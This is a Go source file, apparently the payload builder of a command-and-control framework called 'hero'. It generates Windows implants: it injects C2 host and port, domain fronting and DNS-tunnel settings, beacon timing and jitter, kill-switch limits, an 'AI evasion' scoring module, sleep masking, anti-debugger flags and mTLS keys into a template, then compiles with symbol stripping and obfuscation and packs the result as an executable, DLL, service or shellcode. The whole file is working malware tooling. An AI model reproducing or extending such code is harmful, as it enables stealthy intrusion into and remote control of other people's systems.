//builder/builder.go
package builder

import (
        "crypto/rand"
        "encoding/hex"
        "fmt"
        "math/big"
        "os"
        "os/exec"
        "path/filepath"
        "strconv"
        "strings"
        "text/template"

        "hero/compiler"
        "hero/config"
        "hero/packer"
)

// Builder — payload build karne ka main struct
type Builder struct {
        cfg       *config.PayloadConfig
        workDir   string
        sourceDir string
}

// New — naya Builder banao
func New(cfg *config.PayloadConfig, implantSourcePath string) *Builder {
        return &Builder{
                cfg:       cfg,
                sourceDir: implantSourcePath,
        }
}

// Build — pura build process chalao (Compile + Pack)
func (b *Builder) Build() (*packer.PackResult, error) {

        payloadName := b.cfg.PayloadName
        if payloadName == "" {
                payloadName = randomCodename()
        }
        fmt.Printf("\n[*] Payload name: %s\n", payloadName)

        var err error
        b.workDir, err = os.MkdirTemp("", "hero-build-*")
        if err != nil {
                return nil, fmt.Errorf("failed to create work dir: %w", err)
        }
        defer b.cleanup()

        fmt.Printf("[*] Work directory: %s\n", b.workDir)

        fmt.Println("[*] Copying implant source...")
        buildSrc := filepath.Join(b.workDir, "implant")
        if err := copyDir(b.sourceDir, buildSrc); err != nil {
                return nil, fmt.Errorf("failed to copy source: %w", err)
        }

        // Copy Rust static library to build directory (if it exists)
        // This enables cgo linking with Rust core
        //
        // Rust lib is at: <hero_root>/rust/target/x86_64-pc-windows-gnu/release/libhero_rust.a
        // b.sourceDir is: <hero_root>/implant
        // So Rust dir = sourceDir/../rust
        absSourceDir, _ := filepath.Abs(b.sourceDir)
        heroRoot := filepath.Dir(absSourceDir) // parent of implant/
        rustLibPath := filepath.Join(heroRoot, "rust", "target", "x86_64-pc-windows-gnu", "release", "libhero_rust.a")
        rustLibAvailable := false

        if _, err := os.Stat(rustLibPath); err != nil {
                // Rust lib not pre-built — try to build it automatically
                fmt.Printf("[*] Rust lib not found — auto-building from hero/rust/ ...\n")
                rustDir := filepath.Join(heroRoot, "rust")
                buildScript := filepath.Join(rustDir, "build_rustlib.sh")
                if _, serr := os.Stat(buildScript); serr == nil {
                        cmd := exec.Command("bash", "build_rustlib.sh")
                        cmd.Dir = rustDir
                        out, berr := cmd.CombinedOutput()
                        if berr != nil {
                                fmt.Printf("[!] Auto-build failed: %v\n%s\n", berr, string(out))
                                fmt.Printf("[*] Falling back to Go-only build\n")
                        } else {
                                fmt.Printf("[+] Rust lib built successfully\n")
                        }
                }
        }

        if _, err := os.Stat(rustLibPath); err == nil {
                // Rust lib found — copy to implant/rustlib/
                rustLibDest := filepath.Join(buildSrc, "rustlib")
                os.MkdirAll(rustLibDest, 0755)
                if err := copyFile(rustLibPath, filepath.Join(rustLibDest, "libhero_rust.a"), 0644); err != nil {
                        fmt.Printf("[!] Warning: could not copy Rust lib: %v\n", err)
                } else {
                        fmt.Printf("[+] Rust core library linked: libhero_rust.a\n")
                        rustLibAvailable = true
                }
        } else {
                // Also check pre-built in implant/rustlib/
                prebuiltLib := filepath.Join(heroRoot, "implant", "rustlib", "libhero_rust.a")
                if _, err2 := os.Stat(prebuiltLib); err2 == nil {
                        rustLibDest := filepath.Join(buildSrc, "rustlib")
                        os.MkdirAll(rustLibDest, 0755)
                        if copyFile(prebuiltLib, filepath.Join(rustLibDest, "libhero_rust.a"), 0644) == nil {
                                fmt.Printf("[+] Rust core library linked (pre-built): libhero_rust.a\n")
                                rustLibAvailable = true
                        }
                } else {
                        fmt.Printf("[*] No Rust lib found — using Go fallback\n")
                }
        }

        fmt.Println("[*] Injecting build config...")
        if err := b.injectConfig(buildSrc, payloadName); err != nil {
                return nil, fmt.Errorf("failed to inject config: %w", err)
        }

        if err := os.MkdirAll(b.cfg.OutputDir, 0755); err != nil {
                return nil, fmt.Errorf("failed to create output dir: %w", err)
        }

        ext := outputExtension(b.cfg.OS, b.cfg.Format)
        outputPath := filepath.Join(b.cfg.OutputDir, payloadName+ext)

        fmt.Println("[*] Starting compilation...")
        result, err := compiler.Build(&compiler.CompileOptions{
                SourceDir:        buildSrc,
                OutputPath:       outputPath,
                GOOS:             b.cfg.OS,
                GOARCH:           b.cfg.Arch,
                StripSymbols:     true,
                ObfuscateSymbols: b.cfg.ObfuscateSymbols,
                Debug:            b.cfg.Debug,
                UseRust:          rustLibAvailable,
        })
        if err != nil {
                return nil, fmt.Errorf("build failed: %w", err)
        }

        fmt.Printf("[+] Compiled: %s (%.2f MB)\n", result.OutputPath, float64(result.Size)/1024/1024)

        fmt.Println("[*] Packing payload...")
        packResult, err := packer.Pack(result.OutputPath, b.cfg.OutputDir)
        if err != nil {
                return nil, fmt.Errorf("packing failed: %w", err)
        }

        return packResult, nil
}

// templateData holds all values injected into generated.go
type templateData struct {
        Name                string
        Protocol            string
        C2Host              string
        C2Port              int
        UserAgent           string
        EncryptionKey       string
        FrontDomain         string
        DNSTunnelDomain     string
        C2EndpointPath      string
        IsBeacon            bool
        BeaconInterval      int
        BeaconJitter        int
        ReconnectInterval   int
        MaxConnectionErrors int
        LimitHostname       string
        LimitUsername       string
        LimitDatetime       string
        LimitDomainJoined   bool
        CortexInitialScore      int
        CortexCriticalThreshold int
        CortexLowThreshold      int
        CortexHighThreshold     int
        CortexRecoveryRate      int
        CortexDecayRate         int
        CortexBaseJitterPct     float64
        CortexMaxJitterPct      float64
        // mTLS PKI cert material
        CACertPEM    string // CA cert PEM (server verify ke liye)
        AgentCertPEM string // Agent unique client cert
        AgentKeyPEM  string // Agent private key
}

// injectConfig — user ki config implant source mein inject karo
// Overwrites implant/generated.go with builder-rendered values.
func (b *Builder) injectConfig(srcDir, name string) error {

        encKey := b.cfg.EncryptionKey
        if encKey == "" {
                encKey = generateRandomKey(32)
                fmt.Printf("[*] Generated random 32-byte Encryption Key: %s\n", encKey)
                // CRITICAL: write back so caller (BuildManager) can register PSK
                b.cfg.EncryptionKey = encKey
        }

        tmpl := `// AUTO-GENERATED — DO NOT EDIT
// Generated by hero builder
//go:build windows

package main

// --- Payload Identity ---
// B-CR1: String fields below use the template's quote func (= strconv.Quote)
// so operator-supplied values cannot inject Go source code into generated.go.
var (
        implantName = {{.Name}}
)

// --- C2 Configuration ---
var (
        c2Protocol    = {{.Protocol}}
        c2Host        = {{.C2Host}}
        c2Port        = {{.C2Port}}
        userAgent     = {{.UserAgent}}
        encryptionKey = {{.EncryptionKey}}
)

// --- C2 Advanced (Domain Fronting, DNS Tunneling, Endpoint Path) ---
var (
        frontDomain     = {{.FrontDomain}}
        dnsTunnelDomain = {{.DNSTunnelDomain}}
        c2EndpointPath  = {{.C2EndpointPath}}
)

// --- Beacon Behavior ---
var (
        isBeacon             = {{.IsBeacon}}
        beaconIntervalSec    = {{.BeaconInterval}}
        beaconJitterSec      = {{.BeaconJitter}}
        reconnectIntervalSec = {{.ReconnectInterval}}
        maxConnectionErrors  = {{.MaxConnectionErrors}}
)

// --- Kill-Switch Limits ---
var (
        limitHostname     = {{.LimitHostname}}
        limitUsername     = {{.LimitUsername}}
        limitDatetime     = {{.LimitDatetime}}
        limitDomainJoined = {{.LimitDomainJoined}}
)

// --- Cortex (AI Evasion Brain) Thresholds ---
var (
        cortexInitialScore      = {{.CortexInitialScore}}
        cortexCriticalThreshold = {{.CortexCriticalThreshold}}
        cortexLowThreshold      = {{.CortexLowThreshold}}
        cortexHighThreshold     = {{.CortexHighThreshold}}
        cortexRecoveryRate      = {{.CortexRecoveryRate}}
        cortexDecayRate         = {{.CortexDecayRate}}
        cortexBaseJitterPct     = {{.CortexBaseJitterPct}}
        cortexMaxJitterPct      = {{.CortexMaxJitterPct}}
)

// --- Sleep Masking ---
var (
        sleepMaskingEnabled = true
)

// --- mTLS PKI Certificate Material ---
// Auto-injected by builder from Hero PKI
var (
        mtlsCACert    = ` + "`" + `{{.CACertPEM}}` + "`" + `
        mtlsAgentCert = ` + "`" + `{{.AgentCertPEM}}` + "`" + `
        mtlsAgentKey  = ` + "`" + `{{.AgentKeyPEM}}` + "`" + `
)

// --- Anti-Analysis ---
var (
        hideFromDebugger = true
)
`

        data := templateData{
                Name:                  strconv.Quote(name),
                Protocol:              strconv.Quote(b.cfg.Protocol),
                C2Host:                strconv.Quote(b.cfg.C2Host),
                C2Port:                b.cfg.C2Port,
                UserAgent:             strconv.Quote(b.cfg.UserAgent),
                EncryptionKey:         strconv.Quote(encKey),
                FrontDomain:           strconv.Quote(b.cfg.FrontDomain),
                DNSTunnelDomain:        strconv.Quote(b.cfg.DNSTunnelDomain),
                C2EndpointPath:        strconv.Quote(b.cfg.C2EndpointPath),
                IsBeacon:              b.cfg.IsBeacon,
                BeaconInterval:        b.cfg.BeaconInterval,
                BeaconJitter:          b.cfg.BeaconJitter,
                ReconnectInterval:     b.cfg.ReconnectInterval,
                MaxConnectionErrors:   b.cfg.MaxConnectionErrors,
                LimitHostname:         strconv.Quote(b.cfg.LimitHostname),
                LimitUsername:         strconv.Quote(b.cfg.LimitUsername),
                LimitDatetime:         strconv.Quote(b.cfg.LimitDatetime),
                LimitDomainJoined:     b.cfg.LimitDomainJoined,
                CortexInitialScore:    b.cfg.CortexInitialScore,
                CortexCriticalThreshold: b.cfg.CortexCriticalThreshold,
                CortexLowThreshold:    b.cfg.CortexLowThreshold,
                CortexHighThreshold:   b.cfg.CortexHighThreshold,
                CortexRecoveryRate:    b.cfg.CortexRecoveryRate,
                CortexDecayRate:       b.cfg.CortexDecayRate,
                CortexBaseJitterPct:   b.cfg.CortexBaseJitterPct,
                CortexMaxJitterPct:    b.cfg.CortexMaxJitterPct,
                // mTLS cert material from PKI
                CACertPEM:    b.cfg.CACertPEM,
                AgentCertPEM: b.cfg.AgentCertPEM,
                AgentKeyPEM:  b.cfg.AgentKeyPEM,
        }

        t, err := template.New("config").Funcs(template.FuncMap{
                "quote": strconv.Quote,
        }).Parse(tmpl)
        if err != nil {
                return err
        }

        outFile := filepath.Join(srcDir, "generated.go")
        f, err := os.Create(outFile)
        if err != nil {
                return err
        }
        defer f.Close()

        if err := t.Execute(f, data); err != nil {
                return err
        }

        // Agar go.mod exist nahi karta, toh ek basic go.mod create karo
        goModPath := filepath.Join(srcDir, "go.mod")
        if _, err := os.Stat(goModPath); os.IsNotExist(err) {
                fmt.Println("[*] go.mod not found in source, creating a basic one...")
                goModContent := "module newclientc2/implant\n\ngo 1.22\n"
                if err := os.WriteFile(goModPath, []byte(goModContent), 0644); err != nil {
                        return fmt.Errorf("failed to create go.mod: %w", err)
                }
        }

        return nil
}

func (b *Builder) cleanup() {
        if b.workDir != "" {
                os.RemoveAll(b.workDir)
        }
}

func outputExtension(goos, format string) string {
        switch format {
        case "shellcode":
                return ".bin"
        case "dll":
                return ".dll"
        case "service":
                if goos == "windows" {
                        return ".exe"
                }
                return ""
        default:
                if goos == "windows" {
                        return ".exe"
                }
                return ""
        }
}

func copyDir(src, dst string) error {
        return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
                if err != nil {
                        return err
                }

                relPath, _ := filepath.Rel(src, path)
                dstPath := filepath.Join(dst, relPath)

                if info.IsDir() {
                        return os.MkdirAll(dstPath, info.Mode())
                }

                return copyFile(path, dstPath, info.Mode())
        })
}

func copyFile(src, dst string, mode os.FileMode) error {
        data, err := os.ReadFile(src)
        if err != nil {
                return err
        }
        return os.WriteFile(dst, data, mode)
}

func randomCodename() string {
        adjectives := []string{
                "ANCIENT", "SILENT", "GOLDEN", "DARK", "SWIFT",
                "IRON", "SHADOW", "BLUE", "HIDDEN", "BRAVE",
                "STEEL", "PHANTOM", "GHOST", "CRIMSON", "SILVER",
        }
        nouns := []string{
                "WARRIOR", "FALCON", "STORM", "BLADE", "HUNTER",
                "WOLF", "EAGLE", "VIPER", "TITAN", "RAVEN",
                "COBRA", "PHANTOM", "RANGER", "CIPHER", "DAGGER",
        }

        adjIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(adjectives))))
        nounIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(nouns))))

        adj := adjectives[adjIdx.Int64()]
        noun := nouns[nounIdx.Int64()]

        return strings.ToUpper(adj + "_" + noun)
}

func generateRandomKey(bytesLen int) string {
        b := make([]byte, bytesLen)
        rand.Read(b)
        return hex.EncodeToString(b)
}